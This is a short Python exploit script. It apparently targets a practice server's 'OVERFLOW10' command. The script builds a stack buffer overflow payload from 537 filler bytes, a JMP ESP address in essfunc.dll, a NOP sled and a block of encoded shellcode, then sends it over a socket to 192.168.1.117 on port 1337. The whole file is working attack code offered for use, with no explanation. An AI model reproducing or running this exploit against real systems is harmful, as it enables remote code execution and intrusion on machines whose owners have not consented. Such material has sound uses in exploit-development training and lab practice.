import socket
import sys
import time


print("[+] Nani???? offset!!\n")

buff = "A" * 537

EIP = "\x05\x12\x50\x62" # JMP ESP essfunc.dll

nops = "\x90" * 16

shellcode =  b""
shellcode += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\xed\xe7\x17\x45\x83\xee\xfc"
shellcode += b"\xe2\xf4\x11\x0f\x95\x45\xed\xe7\x77\xcc\x08"
shellcode += b"\xd6\xd7\x21\x66\xb7\x27\xce\xbf\xeb\x9c\x17"
shellcode += b"\xf9\x6c\x65\x6d\xe2\x50\x5d\x63\xdc\x18\xbb"
shellcode += b"\x79\x8c\x9b\x15\x69\xcd\x26\xd8\x48\xec\x20"
shellcode += b"\xf5\xb7\xbf\xb0\x9c\x17\xfd\x6c\x5d\x79\x66"
shellcode += b"\xab\x06\x3d\x0e\xaf\x16\x94\xbc\x6c\x4e\x65"
shellcode += b"\xec\x34\x9c\x0c\xf5\x04\x2d\x0c\x66\xd3\x9c"
shellcode += b"\x44\x3b\xd6\xe8\xe9\x2c\x28\x1a\x44\x2a\xdf"
shellcode += b"\xf7\x30\x1b\xe4\x6a\xbd\xd6\x9a\x33\x30\x09"
shellcode += b"\xbf\x9c\x1d\xc9\xe6\xc4\x23\x66\xeb\x5c\xce"
shellcode += b"\xb5\xfb\x16\x96\x66\xe3\x9c\x44\x3d\x6e\x53"
shellcode += b"\x61\xc9\xbc\x4c\x24\xb4\xbd\x46\xba\x0d\xb8"
shellcode += b"\x48\x1f\x66\xf5\xfc\xc8\xb0\x8f\x24\x77\xed"
shellcode += b"\xe7\x7f\x32\x9e\xd5\x48\x11\x85\xab\x60\x63"
shellcode += b"\xea\x18\xc2\xfd\x7d\xe6\x17\x45\xc4\x23\x43"
shellcode += b"\x15\x85\xce\x97\x2e\xed\x18\xc2\x15\xbd\xb7"
shellcode += b"\x47\x05\xbd\xa7\x47\x2d\x07\xe8\xc8\xa5\x12"
shellcode += b"\x32\x80\x2f\xe8\x8f\xd7\xed\xec\x16\x7f\x47"
shellcode += b"\xed\xe6\xac\xcc\x0b\x8d\x07\x13\xba\x8f\x8e"
shellcode += b"\xe0\x99\x86\xe8\x90\x68\x27\x63\x49\x12\xa9"
shellcode += b"\x1f\x30\x01\x8f\xe7\xf0\x4f\xb1\xe8\x90\x85"
shellcode += b"\x84\x7a\x21\xed\x6e\xf4\x12\xba\xb0\x26\xb3"
shellcode += b"\x87\xf5\x4e\x13\x0f\x1a\x71\x82\xa9\xc3\x2b"
shellcode += b"\x44\xec\x6a\x53\x61\xfd\x21\x17\x01\xb9\xb7"
shellcode += b"\x41\x13\xbb\xa1\x41\x0b\xbb\xb1\x44\x13\x85"
shellcode += b"\x9e\xdb\x7a\x6b\x18\xc2\xcc\x0d\xa9\x41\x03"
shellcode += b"\x12\xd7\x7f\x4d\x6a\xfa\x77\xba\x38\x5c\xf7"
shellcode += b"\x58\xc7\xed\x7f\xe3\x78\x5a\x8a\xba\x38\xdb"
shellcode += b"\x11\x39\xe7\x67\xec\xa5\x98\xe2\xac\x02\xfe"
shellcode += b"\x95\x78\x2f\xed\xb4\xe8\x90"

payload = buff + EIP + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('192.168.1.117', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW10 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
